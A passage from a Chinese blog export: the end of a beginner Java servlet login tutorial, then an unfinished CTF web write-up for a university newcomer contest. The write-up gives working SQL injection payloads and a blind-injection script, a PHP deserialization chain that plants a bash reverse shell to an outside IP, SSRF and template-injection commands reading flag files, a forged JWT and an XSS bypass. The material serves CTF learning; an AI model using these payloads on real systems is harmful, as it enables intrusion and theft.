class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!DOCTYPE html&gt;</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">html</span> <span class="cm-attribute">lang</span>=<span class="cm-string">"en"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">meta</span> <span class="cm-attribute">charset</span>=<span class="cm-string">"UTF-8"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span>登录<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span> <span class="cm-attribute">action</span>=<span class="cm-string">"/study/login"</span> <span class="cm-attribute">method</span>=<span class="cm-string">"get"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">div</span><span class="cm-tag cm-bracket">&gt;</span>用户名<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">name</span>=<span class="cm-string">"username"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">div</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">div</span><span class="cm-tag cm-bracket">&gt;</span>密码<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">name</span>=<span class="cm-string">"password"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">div</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">button</span> <span class="cm-attribute">type</span>=<span class="cm-string">"submit"</span><span class="cm-tag cm-bracket">&gt;</span>登录<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">button</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">html</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 322px;"></div><div class="CodeMirror-gutters" style="display: none; height: 322px;"></div></div></div></pre></li><li><h6 id="src文件夹下创建loginservletjava"><span>src文件夹下创建LoginServlet.java</span></h6><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">package</span> <span class="cm-def">com</span>.<span class="cm-variable">mj</span>.<span class="cm-variable">servlet</span>;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text cm-zwsp></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">javax</span>.<span class="cm-variable">servlet</span>.<span class="cm-variable">ServletException</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">javax</span>.<span class="cm-variable">servlet</span>.<span class="cm-variable">annotation</span>.<span class="cm-variable">WebServlet</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">javax</span>.<span class="cm-variable">servlet</span>.<span class="cm-variable">http</span>.<span class="cm-variable">HttpServlet</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">javax</span>.<span class="cm-variable">servlet</span>.<span class="cm-variable">http</span>.<span class="cm-variable">HttpServletRequest</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">javax</span>.<span class="cm-variable">servlet</span>.<span class="cm-variable">http</span>.<span class="cm-variable">HttpServletResponse</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">io</span>.<span class="cm-variable">IOException</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text cm-zwsp></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">@WebServlet</span>(<span class="cm-string">"/login"</span>) &nbsp;<span class="cm-comment">//相当于在网站根路径创建文件login</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">class</span> <span class="cm-def">LoginServlet</span> <span class="cm-keyword">extends</span> <span class="cm-variable">HttpServlet</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-meta">@Override</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">protected</span> <span class="cm-variable-3">void</span> <span class="cm-variable">doGet</span>(<span class="cm-variable">HttpServletRequest</span> <span class="cm-variable">req</span>, <span class="cm-variable">HttpServletResponse</span> <span class="cm-variable">resp</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">ServletException</span>, <span class="cm-variable">IOException</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// &nbsp; &nbsp; &nbsp;  super.doGet(req, resp);</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">System</span>.<span class="cm-variable">out</span>.<span class="cm-variable">println</span>(<span class="cm-string">"doget---"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">String</span> <span class="cm-variable">username</span> <span class="cm-operator">=</span> <span class="cm-variable">req</span>.<span class="cm-variable">getParameter</span>(<span class="cm-string">"username"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">String</span> <span class="cm-variable">password</span> <span class="cm-operator">=</span> <span class="cm-variable">req</span>.<span class="cm-variable">getParameter</span>(<span class="cm-string">"password"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">System</span>.<span class="cm-variable">out</span>.<span class="cm-variable">println</span>(<span class="cm-variable">username</span><span class="cm-operator">+</span><span class="cm-string">" "</span><span class="cm-operator">+</span><span class="cm-variable">password</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span>(<span class="cm-string">"123"</span>.<span class="cm-variable">equals</span>(<span class="cm-variable">username</span>)<span class="cm-operator">&amp;&amp;</span><span class="cm-string">"456"</span>.<span class="cm-variable">equals</span>(<span class="cm-variable">password</span>)){</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//登录成功</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">resp</span>.<span class="cm-variable">getWriter</span>().<span class="cm-variable">write</span>(<span class="cm-string">"login success"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }<span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">resp</span>.<span class="cm-variable">getWriter</span>().<span class="cm-variable">write</span>(<span class="cm-string">"login failure"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text cm-zwsp></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-meta">@Override</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">protected</span> <span class="cm-variable-3">void</span> <span class="cm-variable">doPost</span>(<span class="cm-variable">HttpServletRequest</span> <span class="cm-variable">req</span>, <span class="cm-variable">HttpServletResponse</span> <span class="cm-variable">resp</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">ServletException</span>, <span class="cm-variable">IOException</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">super</span>.<span class="cm-variable">doPost</span>(<span class="cm-variable">req</span>, <span class="cm-variable">resp</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text cm-zwsp></span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 736px;"></div><div class="CodeMirror-gutters" style="display: none; height: 736px;"></div></div></div></pre><p>&nbsp;</p></li><li><h6 id="测试"><span>测试</span></h6><h6 id="在httplocalhost8080studyhtmlloginhtml输入用户名和密码"><span>在</span><a href="http://localhost:8080/study/html/login.html" target="_blank" class="url">http://localhost:8080/study/html/login.html</a><span>输入用户名和密码</span></h6><p>&nbsp;</p><p><img src="/2021/12/24/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/2.png" referrerpolicy="no-referrer" alt="2"></p><h6 id="即可跳转到localhost8080studylogin"><span>即可跳转到localhost:8080/study/login</span></h6></li></ol><p><img src="/2021/12/24/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/3.png" referrerpolicy="no-referrer" alt="2"></p><h6 id="文件结构"><span>文件结构</span></h6><p><img src="/2021/12/24/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/1.png" referrerpolicy="no-referrer" alt="2"></p></div></div></body></html>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>成信工Geek(未完...)</title>
    <link href="/2021/11/11/CTF/%E6%88%90%E4%BF%A1%E5%B7%A5CTF%E6%96%B0%E7%94%9F%E8%B5%9BWp/"/>
    <url>/2021/11/11/CTF/%E6%88%90%E4%BF%A1%E5%B7%A5CTF%E6%96%B0%E7%94%9F%E8%B5%9BWp/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB方向"><a href="#WEB方向" class="headerlink" title="WEB方向"></a>WEB方向</h1><span id="more"></span><h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00.写在前面"></a>0x00.写在前面</h1><p>hard</p><h1 id="0x01-Dark"><a href="#0x01-Dark" class="headerlink" title="0x01.Dark"></a>0x01.Dark</h1><p>题目链接以.onion后缀+题目dark=洋葱浏览器</p><h1 id="0x02-Welcome2021"><a href="#0x02-Welcome2021" class="headerlink" title="0x02.Welcome2021"></a>0x02.Welcome2021</h1><p>考察http报文格式，按着要求来即可</p><p>1).用WELCOME请求网页</p><p>​        bp抓包修改请求报文的状态行为WELCOME / HTTP/1.1</p><p>2).</p><p>​        按照提示修改状态行WELCOME /f1111aaaggg9.php HTTP/1.1即可</p><h1 id="0x03-babysql"><a href="#0x03-babysql" class="headerlink" title="0x03.babysql"></a>0x03.babysql</h1><p>1)用户名密码输个123可发现弹出一个窗口，查看一下源代码猜测是由对话框进行回显的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;your uname:admin and your pwd:123456&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2)用户名:123’ or 1=1#   密码123 可得到正确用户名密码</p><p>3)用户名:admin’ and 1=1#   密码123成功登陆说明用户名存在注入</p><p>4)用户名:admin’  order by 4#   密码123 可知表里有4列</p><p>5)用户名1’ union select 1,2,3,4#  回显1,2</p><p>6)接下来就是按部就班的查库查表查字段</p><pre><code>  查库1&#39; union select 1,group_concat(schema_name),3,4 from information_schema.schemata#</code></pre><p>​      查表1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’db_name#’</p><p>​      查字段1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’tab_name’#</p><p>​      查值1’ union select 1,2,xx from 字段名#</p><p>7)另外一种是直接用万能脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author:Kang Classmate</span><br><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://47.100.242.70:4339/index.php&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <br>        payload=<span class="hljs-string">f&quot;or((if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)))#&quot;</span><br>        <span class="hljs-comment">#payload=f&quot;or((if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(!(table_schema&lt;&gt;database()))),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)))#&quot;</span><br>        <span class="hljs-comment">#payload=f&quot;or((if(ascii(mid((SELECT(group_concat(column_name))from(information_schema.columns)where(!(table_name&lt;&gt;0x6a656666))),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)))#&quot;</span><br>        <span class="hljs-comment">#payload=f&quot;or((if(ascii(mid((select(group_concat(id))from(jeffjokes)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)))#&quot;</span><br>        <span class="hljs-comment">#payload=f&quot;or(ascii(substr(version(),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;</span><br>        headers=&#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>            &#125;<br>        data=&#123;<br>            <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;pwd&#x27;</span>:payload<br>            &#125;<br>        response=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">min</span> =mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span>=mid<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">min</span> !=<span class="hljs-number">32</span> :<br>        flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">min</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="0x04-babyPOP"><a href="#0x04-babyPOP" class="headerlink" title="0x04.babyPOP"></a>0x04.babyPOP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Do_u_like_JiaRan</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Do_u_like_AFKL</span> = <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$i_want_2_listen_2_MaoZhongDu</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu=<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/110.42.204.228/3389 0&gt;&amp;1&#x27;&quot;</span>; <br>&#125;        <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;   <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;value=<span class="hljs-keyword">new</span> b(); <br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$temp1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$afkl</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;temp1=<span class="hljs-keyword">new</span> c();<br><span class="hljs-keyword">$this</span>-&gt;afkl=<span class="hljs-keyword">new</span> d();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-keyword">new</span> e())));<br><span class="hljs-comment">//O:1:&quot;e&quot;:2:&#123;s:5:&quot;temp1&quot;;O:1:&quot;c&quot;:0:&#123;&#125;s:4:&quot;afkl&quot;;O:1:&quot;d&quot;:1:&#123;s:5:&quot;value&quot;;O:1:&quot;b&quot;:1:&#123;s:31:&quot;bi_want_2_listen_2_MaoZhongDu&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;</span><br><span class="hljs-comment">//c e d b   //pop链</span><br></code></pre></td></tr></table></figure><p>利用vps监听3389端口反弹shell即可成查看flag</p><h1 id="0x05-where-is-my-FUMO"><a href="#0x05-where-is-my-FUMO" class="headerlink" title="0x05.where_is_my_FUMO"></a>0x05.where_is_my_FUMO</h1><h1 id="0x06-babyphp"><a href="#0x06-babyphp" class="headerlink" title="0x06.babyphp"></a>0x06.babyphp</h1><p>1.robots.txt查看noobcurl.php文件，ssrf</p><p>根据hint构造payload:?url=file:///flag即可</p><h1 id="0x07-babypy"><a href="#0x07-babypy" class="headerlink" title="0x07.babypy"></a>0x07.babypy</h1><p>简单的python模板注入</p><p>bp抓包发现post传两个参数，测试发现body存在注入点，引用万能模板即可</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27ls</span>%<span class="hljs-number">20</span>../%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27cat</span>%<span class="hljs-number">20</span>../flag/%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">20config.__class__.__init__.__globals__</span>[%27os%27].popen(%<span class="hljs-name">27cat</span>%<span class="hljs-number">20</span>../flag%<span class="hljs-number">27</span>).read()%<span class="hljs-number">20</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="0x08-蜜雪冰城"><a href="#0x08-蜜雪冰城" class="headerlink" title="0x08.蜜雪冰城"></a>0x08.蜜雪冰城</h1><p>修改id=9即可</p><h1 id="0x09-雷克雅未克"><a href="#0x09-雷克雅未克" class="headerlink" title="0x09.雷克雅未克"></a>0x09.雷克雅未克</h1><h5 id="个个也探问爱恋不老的秘方-唯独壮烈离座可百世流芳"><a href="#个个也探问爱恋不老的秘方-唯独壮烈离座可百世流芳" class="headerlink" title="个个也探问爱恋不老的秘方 唯独壮烈离座可百世流芳."></a>个个也探问爱恋不老的秘方 唯独壮烈离座可百世流芳.</h5><p>抓包添加请求头X-Forwarded-For:5.23.95.255且修改cookie为经纬度，查看check.php文件，发现一串编码为js混淆编码，赋值到控制台执行即可</p><h1 id="0x0a-人民艺术家"><a href="#0x0a-人民艺术家" class="headerlink" title="0x0a.人民艺术家"></a>0x0a.人民艺术家</h1><p>抓包发现fail.php文件</p><p>用正确用户名密码登录后发现响应头存在JWT(JWT=header+payload+signature)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JWT</span>: eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">0</span>aW<span class="hljs-number">1</span>lIjoiMjAyMSIsIm<span class="hljs-number">5</span>hbWUiOiJmYWtlX<span class="hljs-number">2</span>FkbWluIn<span class="hljs-number">0</span>.rclssTrPKaSGoIPJZ<span class="hljs-number">0</span>RxKIb<span class="hljs-number">1</span>h_DDTtxzHQIQ<span class="hljs-number">0</span>Vlbj<span class="hljs-number">7</span>g<br></code></pre></td></tr></table></figure><p>解码后修改payload:</p><p>{<br>  “time”: “2019”,<br>  “name”: “admin”<br>}</p><p>脚本爆破得到秘钥1234</p><p>添加请求头部</p><p>jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lIjoiMjAxOSIsIm5hbWUiOiJhZG1pbiJ9.WInN2vLaV6NMMsfu-6-foUOZ8trV9Ll2RsZ_gGd8Idk</p><p>访问所给文件即可</p><h1 id="0x0b-babyXss"><a href="#0x0b-babyXss" class="headerlink" title="0x0b.babyXss"></a>0x0b.babyXss</h1><p>input:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alalertert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x0c-Baby-PHP-Black"><a href="#0x0c-Baby-PHP-Black" class="headerlink" 